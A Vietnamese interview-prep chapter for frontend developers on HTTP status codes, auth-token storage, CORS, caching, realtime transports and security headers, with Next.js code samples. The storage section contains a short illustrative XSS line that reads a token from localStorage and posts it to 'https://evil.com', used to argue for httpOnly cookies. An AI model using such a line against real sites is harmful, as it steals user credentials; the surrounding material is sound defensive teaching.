---
sidebar_position: 4
title: "4. HTTP, Storage & Networking"
---

# HTTP, Storage & Networking

> *Network là chỗ FE-only dev hay yếu nhất. Hiểu phần này giúp bạn debug "tại sao API chậm", "tại sao login bị logout", "tại sao CORS chặn".*

:::note[Ghi nhớ nhanh]

- ⭐ **Auth token trong `httpOnly` cookie** (+ `secure`, `sameSite`) chống XSS đọc token; localStorage chỉ cho non-sensitive; cookie cần CSRF token cho mutation.
- ⭐ **Status codes** — `201` created, `204` no content, `401` chưa auth vs `403` không quyền, `409` conflict, `422` validation, `429` rate limit; 4xx là client fault, 5xx server fault.
- **CORS** — Same-Origin Policy; server phải trả `Access-Control-Allow-Origin`; preflight `OPTIONS` cho request non-simple; cookie cross-origin cần credentials + origin cụ thể (không `*`) + `sameSite: none`.
- **Cache-Control** — `immutable` cho asset có hash, `no-cache` = vẫn cache nhưng phải revalidate (khác `no-store`), `stale-while-revalidate`, ETag cho 304.
- **Realtime** — WebSocket bidirectional cho chat; SSE server-push only (đơn giản, cho notification/AI streaming); long polling chỉ legacy fallback.
- **Security headers** — HSTS, `X-Frame-Options`, `X-Content-Type-Options: nosniff`, và quan trọng nhất `Content-Security-Policy` (nonce-based) chống XSS.

:::

---

## Câu 1: HTTP Status Codes — em hay dùng cái nào? `[Intermediate]`

### Câu hỏi

> Liệt kê 5 status code em **dùng nhiều nhất** trong API và khi nào dùng cái nào.

### Giải thích lý thuyết

| Code | Tên                       | Khi nào dùng                                            |
| ---- | ------------------------- | ------------------------------------------------------- |
| 200  | OK                        | Request thành công, có data                             |
| 201  | Created                   | POST tạo resource thành công                            |
| 204  | No Content                | Success nhưng không cần trả body (DELETE, PUT idempotent) |
| 301  | Moved Permanently         | Redirect vĩnh viễn (URL thay đổi mãi mãi)               |
| 302  | Found                     | Redirect tạm thời                                       |
| 304  | Not Modified              | Cache còn valid (conditional GET)                       |
| 400  | Bad Request               | Client gửi data sai format/validation                   |
| 401  | Unauthorized              | Chưa authenticate                                       |
| 403  | Forbidden                 | Đã authenticate nhưng không có quyền                    |
| 404  | Not Found                 | Resource không tồn tại                                  |
| 409  | Conflict                  | Resource conflict (duplicate email khi register)        |
| 422  | Unprocessable Entity      | Validation fail (modern alternative cho 400)            |
| 429  | Too Many Requests         | Rate limit                                              |
| 500  | Internal Server Error     | Server error                                            |
| 502  | Bad Gateway               | Upstream service fail                                   |
| 503  | Service Unavailable       | Server overload, maintenance                            |
| 504  | Gateway Timeout           | Upstream timeout                                        |

### Code minh hoạ

```typescript
// app/api/users/route.ts (Next.js)
import { NextResponse } from "next/server";

export async function POST(req: Request) {
  // 1. Authentication check
  const session = await getSession(req);
  if (!session) {
    return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
  }

  // 2. Authorization check
  if (session.role !== "admin") {
    return NextResponse.json({ error: "Forbidden" }, { status: 403 });
  }

  // 3. Validation
  const body = await req.json();
  const parsed = userSchema.safeParse(body);
  if (!parsed.success) {
    return NextResponse.json({ errors: parsed.error.flatten() }, { status: 422 });
  }

  // 4. Business logic — conflict
  const exists = await db.user.findUnique({ where: { email: parsed.data.email } });
  if (exists) {
    return NextResponse.json({ error: "Email already in use" }, { status: 409 });
  }

  // 5. Create — 201 Created
  const user = await db.user.create({ data: parsed.data });
  return NextResponse.json(user, { status: 201 });
}

export async function GET(req: Request) {
  const { searchParams } = new URL(req.url);
  const id = searchParams.get("id");

  const user = await db.user.findUnique({ where: { id } });
  if (!user) {
    return NextResponse.json({ error: "Not found" }, { status: 404 });
  }

  return NextResponse.json(user); // 200 default
}

export async function DELETE(req: Request, { params }) {
  await db.user.delete({ where: { id: params.id } });
  return new NextResponse(null, { status: 204 }); // No content
}

// Client error handling
async function createUser(data) {
  const res = await fetch("/api/users", {
    method: "POST",
    body: JSON.stringify(data),
  });

  if (res.status === 401) {
    redirect("/signin");
    return;
  }
  if (res.status === 403) {
    toast.error("Không có quyền thực hiện");
    return;
  }
  if (res.status === 409) {
    return { error: "Email đã được sử dụng" };
  }
  if (res.status === 422) {
    const { errors } = await res.json();
    return { fieldErrors: errors };
  }
  if (!res.ok) {
    Sentry.captureException(new Error(`API error ${res.status}`));
    return { error: "Có lỗi xảy ra" };
  }

  return { data: await res.json() };
}
```

### Đáp án mẫu

> "Top 5 em dùng nhất: **200** cho GET success; **201** cho POST tạo resource (kèm Location header trỏ resource mới); **204** cho DELETE/PUT idempotent không cần trả body; **400/422** cho validation error (em prefer 422 vì 400 chung chung; 422 = 'request parse được nhưng semantic sai'); **401** cho chưa auth, **403** cho không có quyền (phân biệt rõ: 401 → redirect signin, 403 → toast 'không có quyền'); **404** cho not found; **409** cho conflict (email duplicate); **429** cho rate limit. Phía client em handle dựa trên status: 401 redirect login, 422 show field-level error, 5xx log Sentry + generic message. Một detail: 4xx là **client fault** (sửa request), 5xx là **server fault** (retry, fallback). Quy tắc phỏng vấn ngược: nếu interviewer chấp nhận em dùng 200 cho mọi response (anti-pattern 'always 200 with error in body'), đó là red flag về team's API design."

---

## Câu 2: Cookie vs localStorage vs sessionStorage `[Intermediate]`

### Câu hỏi

> Em lưu auth token ở đâu? Cookie hay localStorage? Pros/cons mỗi cái?

### Giải thích lý thuyết

| Storage         | Capacity | Lifetime              | Send với request | Access from JS | XSS risk | CSRF risk |
| --------------- | -------- | --------------------- | ---------------- | -------------- | -------- | --------- |
| Cookie          | ~4KB     | Set expiry            | Yes (cùng domain) | Yes (trừ httpOnly) | Low (httpOnly) | Yes (cần CSRF token) |
| localStorage    | ~5-10MB  | Vĩnh viễn             | No               | Yes            | High     | No        |
| sessionStorage  | ~5-10MB  | Tab close             | No               | Yes            | High     | No        |
| IndexedDB       | Lớn (>50MB) | Vĩnh viễn          | No               | Yes (async)    | High     | No        |

Auth token best practice:
- **httpOnly cookie** — không access từ JS → XSS không stole được token.
- **secure** flag — chỉ gửi qua HTTPS.
- **sameSite=lax/strict** — CSRF protection.
- Pair với CSRF token cho mutation request.

### Code minh hoạ

```typescript
// Set secure session cookie
"use server";
import { cookies } from "next/headers";

async function login(formData: FormData) {
  const { token, refreshToken } = await api.login(...);

  const cookieStore = await cookies();

  // Session token — short lived
  cookieStore.set("session", token, {
    httpOnly: true,                 // không access từ JS
    secure: true,                   // chỉ HTTPS
    sameSite: "lax",                // CSRF protection
    maxAge: 60 * 60,                // 1 hour
    path: "/",
  });

  // Refresh token — longer
  cookieStore.set("refresh", refreshToken, {
    httpOnly: true,
    secure: true,
    sameSite: "strict",             // strict cho refresh
    maxAge: 60 * 60 * 24 * 30,      // 30 days
    path: "/api/auth/refresh",      // chỉ gửi cho refresh endpoint
  });
}

// localStorage — chỉ cho non-sensitive data
localStorage.setItem("theme", "dark");
localStorage.setItem("recentSearches", JSON.stringify(searches));

// Lưu user info ở localStorage để hiển thị → an toàn nếu KHÔNG có token
localStorage.setItem("user", JSON.stringify({ name, email, avatar }));
// Token vẫn ở httpOnly cookie

// sessionStorage — clear khi tab close
sessionStorage.setItem("draftPost", JSON.stringify(draft));

// IndexedDB — lớn, async, structured
import { openDB } from "idb";

const db = await openDB("app", 1, {
  upgrade(db) {
    db.createObjectStore("offline-data", { keyPath: "id" });
  },
});
await db.put("offline-data", { id: "1", data: "..." });

// Pitfall: localStorage XSS attack
// Attacker chèn script qua XSS → đọc localStorage → steal token
const token = localStorage.getItem("token");
fetch("https://evil.com", { method: "POST", body: token });

// Với httpOnly cookie: attacker không đọc được token từ JS
// Nhưng vẫn có thể gọi API thay user (vì cookie tự gửi) — cần CSRF token

// CSRF protection
"use server";
async function transferMoney(formData: FormData) {
  const cookieStore = await cookies();
  const csrfCookie = cookieStore.get("csrf")?.value;
  const csrfBody = formData.get("csrfToken");

  if (csrfCookie !== csrfBody) {
    throw new Error("CSRF token mismatch");
  }

  // ... process
}
```

### Đáp án mẫu

> "Auth token em lưu trong **httpOnly cookie** với `secure: true` và `sameSite: 'lax'`. Lý do: XSS attack không đọc được token từ JS (httpOnly), tránh trường hợp script chèn lậu steal credential. localStorage exposed với JS — XSS một lần là user mất account. Trade-off: httpOnly cookie tự gửi với mọi request → CSRF risk → cần CSRF token cho mutation. Em pair: cookie cho session + CSRF token (double submit pattern) cho POST/PUT/DELETE. Cookie có 2 token: session ngắn hạn (1h), refresh dài hơn (30 ngày, sameSite=strict, path chỉ /api/refresh để minimize exposure). localStorage em chỉ lưu non-sensitive: theme, recent search, draft. Một thông tin hiển thị (name, email, avatar) cũng OK ở localStorage để không phải gọi API mỗi render — vẫn check session real qua API khi cần. sessionStorage cho data tab-scoped (draft form). IndexedDB cho offline app — lớn, async, structured."

---

## Câu 3: CORS — em hay debug bug gì? `[Intermediate]`

### Câu hỏi

> Frontend ở `app.example.com`, backend ở `api.example.com`. Console báo "CORS error". Em debug ra sao?

### Giải thích lý thuyết

**Same-Origin Policy**: browser chặn JS đọc response từ origin khác (different protocol, domain, port).

**CORS** (Cross-Origin Resource Sharing): cơ chế server đồng ý cho cross-origin truy cập qua header.

Flow:
1. **Simple request** (GET, HEAD, POST với content-type form): browser gửi ngay, kiểm tra header response.
2. **Preflight** (custom header, PUT/DELETE, content-type JSON): browser gửi `OPTIONS` trước, server trả về allowed methods/headers, sau đó gửi request thật.

Common bug:
- Server không trả `Access-Control-Allow-Origin`.
- Preflight không handle `OPTIONS`.
- Credential (cookie) cross-origin cần `credentials: 'include'` + server `Access-Control-Allow-Credentials: true` + origin specific (không wildcard).

### Code minh hoạ

```javascript
// Client
fetch("https://api.example.com/data", {
  method: "GET",
  credentials: "include", // gửi cookie cross-origin
});

// Browser tự gửi header `Origin: https://app.example.com`
// Server must respond:
// Access-Control-Allow-Origin: https://app.example.com
// Access-Control-Allow-Credentials: true (nếu credentials: include)

// Server (Next.js Route Handler)
export async function GET(req: Request) {
  const origin = req.headers.get("origin");
  const allowedOrigins = ["https://app.example.com", "https://staging.example.com"];

  const isAllowed = allowedOrigins.includes(origin);

  const data = await fetchData();

  return new Response(JSON.stringify(data), {
    headers: {
      "Content-Type": "application/json",
      "Access-Control-Allow-Origin": isAllowed ? origin : "",
      "Access-Control-Allow-Credentials": "true",
      "Vary": "Origin", // cache key includes origin
    },
  });
}

// Preflight handler
export async function OPTIONS(req: Request) {
  return new Response(null, {
    headers: {
      "Access-Control-Allow-Origin": "https://app.example.com",
      "Access-Control-Allow-Methods": "GET, POST, PUT, DELETE, OPTIONS",
      "Access-Control-Allow-Headers": "Content-Type, Authorization",
      "Access-Control-Allow-Credentials": "true",
      "Access-Control-Max-Age": "86400", // cache preflight 1 day
    },
  });
}

// Common bug: cookie không gửi cross-origin
// Cần CẢ 3:
// 1. Client: credentials: "include"
// 2. Server: Access-Control-Allow-Credentials: true
// 3. Server: Access-Control-Allow-Origin: SPECIFIC origin (không *)
// 4. Cookie: sameSite=None + secure=true

// SameSite=None: cookie gửi cross-origin (yêu cầu secure)
cookieStore.set("session", token, {
  httpOnly: true,
  secure: true,
  sameSite: "none", // BUỘC khi cross-origin
});

// Debug CORS qua DevTools Network tab:
// - Click failed request
// - Tab Headers: xem Origin sent, Access-Control-Allow-* response
// - Tab Response: nếu trống, có thể là preflight fail

// Workaround: same-origin proxy
// app.example.com/api/* → proxy → api.example.com
// Browser thấy cùng origin, không CORS
```

### Đáp án mẫu

> "Em debug theo 4 step. **Step 1**: mở DevTools Network tab, tìm request fail. Có 1 hay 2 request? Nếu có `OPTIONS` request trước → là **preflight**. **Step 2**: check response của OPTIONS — server có trả `Access-Control-Allow-Origin`, `Allow-Methods`, `Allow-Headers` không? Nếu OPTIONS fail (404), backend không handle preflight → fix server. **Step 3**: check actual request — `Origin` header browser gửi và `Access-Control-Allow-Origin` response. Match không? Nếu là wildcard `*` mà client dùng `credentials: 'include'` → fail, phải specific origin. **Step 4**: nếu gửi cookie, cần combo: client `credentials: 'include'`, server `Allow-Credentials: true`, server `Allow-Origin: <specific>`, và cookie phải `sameSite: 'none', secure: true`. Common bug em thấy: dev cấu hình `Allow-Origin: *` để 'cho qua', rồi không gửi được cookie — phải fix về specific. Workaround production phổ biến: same-origin proxy — `app.com/api/*` proxy về `api.example.com` để browser thấy cùng origin, bypass CORS hoàn toàn."

---

## Câu 4: HTTP Cache headers — Cache-Control, ETag `[Senior]`

### Câu hỏi

> Em config cache cho API và static asset thế nào? Giải thích `Cache-Control: public, max-age=3600, stale-while-revalidate=86400`.

### Giải thích lý thuyết

**Cache-Control** directive:

| Directive            | Nghĩa                                                            |
| -------------------- | ---------------------------------------------------------------- |
| `public`             | Cache được bởi shared cache (CDN)                                |
| `private`            | Chỉ cache bởi browser, không CDN                                 |
| `no-cache`           | Phải revalidate với origin trước khi dùng (vẫn cache)            |
| `no-store`           | Không cache gì cả                                                |
| `max-age=N`          | Fresh trong N giây                                               |
| `s-maxage=N`         | max-age cho shared cache (CDN), override max-age                  |
| `stale-while-revalidate=N` | Sau max-age, dùng stale + revalidate background trong N giây |
| `immutable`          | Asset không bao giờ đổi (file có hash)                            |
| `must-revalidate`    | Bắt buộc check khi stale                                          |

**Validators**:
- `ETag` — hash của content, server gửi ngược client trong `If-None-Match`. Match → 304.
- `Last-Modified` — timestamp, client gửi `If-Modified-Since`.

### Code minh hoạ

```javascript
// Static asset với hash (immutable) — cache forever
// /_next/static/chunks/main-abc123.js
{
  "Cache-Control": "public, max-age=31536000, immutable"
}
// 1 năm, immutable → browser không revalidate, dùng cache thẳng

// HTML page — không cache hoặc cache ngắn
{
  "Cache-Control": "private, no-cache, must-revalidate"
}
// Browser luôn revalidate với server (ETag check)

// API response — stale-while-revalidate
{
  "Cache-Control": "public, max-age=60, stale-while-revalidate=600"
}
// 0-60s: serve cache (fresh)
// 60-660s: serve cache stale + revalidate background
// >660s: phải fetch lại

// ETag handshake
// Request 1
GET /api/users
// Response
ETag: "abc123"
Cache-Control: public, max-age=60

// Request 2 (sau 60s)
GET /api/users
If-None-Match: "abc123"

// Server compare ETag
// Match → 304 Not Modified (không body, browser dùng cache)
// Differ → 200 với data + new ETag

// Next.js — đặt cache header
// app/api/data/route.ts
export async function GET() {
  const data = await fetchExpensive();

  return Response.json(data, {
    headers: {
      "Cache-Control": "public, s-maxage=60, stale-while-revalidate=300",
    },
  });
}

// next.config.js — static asset
module.exports = {
  async headers() {
    return [
      {
        source: "/_next/static/(.*)",
        headers: [
          { key: "Cache-Control", value: "public, max-age=31536000, immutable" },
        ],
      },
      {
        source: "/api/(.*)",
        headers: [
          { key: "Cache-Control", value: "no-store" },
        ],
      },
    ];
  },
};
```

```javascript
// Service Worker cache cho offline
self.addEventListener("fetch", (e) => {
  if (e.request.url.includes("/api/")) {
    e.respondWith(networkFirst(e.request));
  } else if (e.request.destination === "image") {
    e.respondWith(cacheFirst(e.request));
  }
});

async function cacheFirst(req) {
  const cached = await caches.match(req);
  return cached ?? fetch(req).then((res) => {
    const cache = caches.open("images-v1");
    cache.then((c) => c.put(req, res.clone()));
    return res;
  });
}
```

### Đáp án mẫu

> "Giải thích directive đó: `public` = CDN cache được; `max-age=3600` = browser/CDN cache 1 giờ; `stale-while-revalidate=86400` = sau 1 giờ, vẫn serve cache cũ thêm 24 giờ NHƯNG đồng thời revalidate background. User không bao giờ chờ revalidation, mọi request dưới 25 giờ đều fast. Strategy em config: **static asset có hash** (Webpack/Vite output `main-abc123.js`): `max-age=31536000, immutable` — cache 1 năm, browser không revalidate, dùng cache thẳng. Vì file đổi sẽ có hash mới → URL khác → cache mới. **HTML**: `private, no-cache` — browser cache nhưng phải revalidate (ETag check) — vì content thay đổi (user-specific). **API** dạng public data: `s-maxage=60, stale-while-revalidate=300` để CDN cache + SWR. **API dạng user-specific** (`/api/me`): `no-store` — không cache đâu hết. ETag: server gửi hash, browser gửi lại `If-None-Match` ở request sau, match thì 304 (no body, save bandwidth). Next.js đặt header trong `next.config.js` cho static path, hoặc trong Route Handler response."

---

## Câu 5: WebSocket vs Server-Sent Events vs Long Polling `[Senior]`

### Câu hỏi

> Em làm chat realtime. Chọn WebSocket, SSE, hay long polling? Tại sao?

### Giải thích lý thuyết

| Tech              | Direction          | Browser support | Complexity | Use case                       |
| ----------------- | ------------------ | --------------- | ---------- | ------------------------------ |
| **Long polling**  | Server → client    | Universal       | Medium     | Legacy fallback                |
| **SSE**           | Server → client    | Modern          | Low        | Notification, stock ticker, AI chat tokens |
| **WebSocket**     | Bidirectional      | Modern          | High       | Chat, collaborative editing, gaming |

WebSocket: full duplex, binary support, low overhead per message after handshake.
SSE: simpler (over HTTP), auto-reconnect, only server→client.

### Code minh hoạ

```javascript
// 1. WebSocket — bidirectional chat
const ws = new WebSocket("wss://api.example.com/chat");

ws.onopen = () => console.log("connected");
ws.onmessage = (e) => {
  const message = JSON.parse(e.data);
  appendMessage(message);
};
ws.onclose = () => reconnect();
ws.onerror = (err) => console.error(err);

// Send
ws.send(JSON.stringify({ type: "message", text: "Hello" }));

// Reconnect with exponential backoff
let retries = 0;
function reconnect() {
  setTimeout(() => {
    connect();
    retries++;
  }, Math.min(1000 * 2 ** retries, 30000));
}

// 2. SSE — server push only
const es = new EventSource("/api/notifications");

es.onmessage = (e) => {
  const data = JSON.parse(e.data);
  showNotification(data);
};

es.addEventListener("typing", (e) => {
  // custom event type
});

es.onerror = () => {
  // auto reconnect built-in
};

// Server SSE (Next.js)
export async function GET() {
  const stream = new ReadableStream({
    async start(controller) {
      const send = (data) => {
        controller.enqueue(new TextEncoder().encode(`data: ${JSON.stringify(data)}\n\n`));
      };

      send({ message: "connected" });

      const interval = setInterval(() => {
        send({ time: Date.now() });
      }, 5000);

      // cleanup khi client disconnect
      // (Next.js handle qua request cancel signal)
    },
  });

  return new Response(stream, {
    headers: {
      "Content-Type": "text/event-stream",
      "Cache-Control": "no-cache",
      Connection: "keep-alive",
    },
  });
}

// 3. Long polling — legacy
async function poll() {
  while (true) {
    try {
      const res = await fetch("/api/poll", { timeout: 30000 });
      const data = await res.json();
      if (data.message) handleMessage(data);
    } catch (e) {
      await sleep(1000);
    }
  }
}

// Modern: pusher.com, ably.com, supabase realtime — managed WebSocket
import { createClient } from "@supabase/supabase-js";

const supabase = createClient(url, key);
supabase
  .channel("messages")
  .on("postgres_changes", { event: "INSERT", schema: "public", table: "messages" }, (payload) => {
    appendMessage(payload.new);
  })
  .subscribe();
```

### Đáp án mẫu

> "Cho chat realtime, em chọn **WebSocket** vì bidirectional + low overhead. SSE chỉ server → client, không gửi message user nhập được qua cùng connection — phải pair với POST endpoint riêng, tách 2 protocol awkward. Long polling em không dùng cho app mới — chỉ legacy fallback. Implementation: native WebSocket OK cho POC, production em dùng managed service (Pusher, Ably, Supabase Realtime) hoặc tự host Socket.IO. Lý do: reconnect logic, presence, room/channel management, scaling đều complex tự code. SSE em chọn khi: notification system, stock ticker, hoặc **AI chat streaming** (LLM token-by-token) — server push only, không cần client gửi gì giữa chừng. SSE đơn giản hơn (HTTP standard, auto-reconnect built-in), không cần WebSocket infrastructure. Một detail thực tế: WebSocket bị nhiều corporate firewall block — em luôn fallback SSE hoặc long polling. Vercel serverless không host WebSocket lâu dài được — phải dùng managed hoặc self-host VPS."

---

## Câu 6: HTTPS, TLS và Security Headers `[Senior]`

### Câu hỏi

> Em deploy production. Ngoài HTTPS, em set security header gì?

### Giải thích lý thuyết

Security headers quan trọng:

| Header                              | Tác dụng                                                  |
| ----------------------------------- | --------------------------------------------------------- |
| `Strict-Transport-Security` (HSTS)  | Force HTTPS cho domain                                    |
| `Content-Security-Policy` (CSP)     | Chặn XSS — chỉ load script từ source whitelist            |
| `X-Frame-Options`                   | Chặn clickjacking (iframe)                                |
| `X-Content-Type-Options: nosniff`   | Browser không sniff MIME type                             |
| `Referrer-Policy`                   | Control thông tin Referer khi navigate                    |
| `Permissions-Policy`                | Disable feature (camera, mic, geolocation) cho 3rd-party  |
| `Cross-Origin-Opener-Policy`        | Isolate window từ cross-origin                            |
| `Cross-Origin-Embedder-Policy`      | Force CORP cho subresource                                |

### Code minh hoạ

```javascript
// next.config.js
const securityHeaders = [
  {
    key: "Strict-Transport-Security",
    value: "max-age=63072000; includeSubDomains; preload",
  },
  {
    key: "X-Frame-Options",
    value: "DENY", // hoặc SAMEORIGIN nếu cần embed
  },
  {
    key: "X-Content-Type-Options",
    value: "nosniff",
  },
  {
    key: "Referrer-Policy",
    value: "strict-origin-when-cross-origin",
  },
  {
    key: "Permissions-Policy",
    value: "camera=(), microphone=(), geolocation=(), interest-cohort=()",
  },
  {
    key: "Content-Security-Policy",
    value: [
      "default-src 'self'",
      "script-src 'self' 'unsafe-inline' https://cdn.vercel-insights.com",
      "style-src 'self' 'unsafe-inline'",
      "img-src 'self' data: https:",
      "font-src 'self' data:",
      "connect-src 'self' https://api.example.com wss://realtime.example.com",
      "frame-ancestors 'none'",
      "base-uri 'self'",
      "form-action 'self'",
    ].join("; "),
  },
];

module.exports = {
  async headers() {
    return [
      {
        source: "/:path*",
        headers: securityHeaders,
      },
    ];
  },
};
```

```javascript
// CSP với nonce (recommend cho inline script)
// middleware.ts
import { NextResponse } from "next/server";

export function middleware(req) {
  const nonce = Buffer.from(crypto.randomUUID()).toString("base64");
  const cspHeader = `
    default-src 'self';
    script-src 'self' 'nonce-${nonce}' 'strict-dynamic';
    style-src 'self' 'unsafe-inline';
    img-src 'self' data:;
  `.replace(/\s{2,}/g, " ").trim();

  const res = NextResponse.next({
    headers: {
      "x-nonce": nonce,
      "Content-Security-Policy": cspHeader,
    },
  });
  return res;
}

// Sử dụng nonce trong component
import { headers } from "next/headers";

async function Page() {
  const nonce = (await headers()).get("x-nonce");
  return (
    <Script nonce={nonce} src="/analytics.js" />
  );
}
```

```javascript
// Verify headers
// curl -I https://example.com
// hoặc dùng tool online: securityheaders.com, observatory.mozilla.org

// Test CSP local — DevTools Console warns nếu CSP violated
// "Refused to load the script ... because it violates ... CSP directive"
```

### Đáp án mẫu

> "Em set tất cả core security header. **HSTS** với `max-age=63072000` (2 năm) + `includeSubDomains` + `preload` — đăng ký vào HSTS preload list để browser hardcode HTTPS-only ngay từ DNS. **X-Frame-Options: DENY** chặn page bị iframe (clickjacking). **X-Content-Type-Options: nosniff** browser không guess MIME type — chặn MIME confusion attack. **Referrer-Policy: strict-origin-when-cross-origin** — không leak URL details. **Permissions-Policy** disable camera/mic/geolocation cho 3rd-party iframe — và `interest-cohort=()` opt-out FLoC tracking. Quan trọng nhất là **CSP** — chặn XSS rất hiệu quả. Best practice em dùng: nonce-based CSP qua middleware — generate random nonce mỗi request, inject vào CSP header + script tag, attacker không thể inject script vì không có nonce. Tránh `'unsafe-inline'` cho script trừ khi thực sự cần. Test với securityheaders.com hoặc Mozilla Observatory — grade A+ là mục tiêu. Một detail: CSP `report-uri` để log violation về backend — biết được attack attempt thực tế."

---

## Bẫy thường gặp khi trả lời

| Sai lầm                                                | Đúng là                                                              |
| ------------------------------------------------------ | -------------------------------------------------------------------- |
| "200 cho mọi response, error trong body"               | Anti-pattern — middleware/SDK rely trên status code                  |
| "localStorage an toàn để lưu token"                    | XSS đọc được mọi thứ trong localStorage                              |
| "CORS chỉ là vấn đề client"                            | Cần config server header — client không bypass được                  |
| "Cache-Control: no-cache = không cache"                | Vẫn cache, nhưng phải revalidate; `no-store` mới là không cache       |
| "WebSocket cần thiết cho mọi realtime feature"         | SSE đủ cho server-push only — đơn giản hơn nhiều                      |
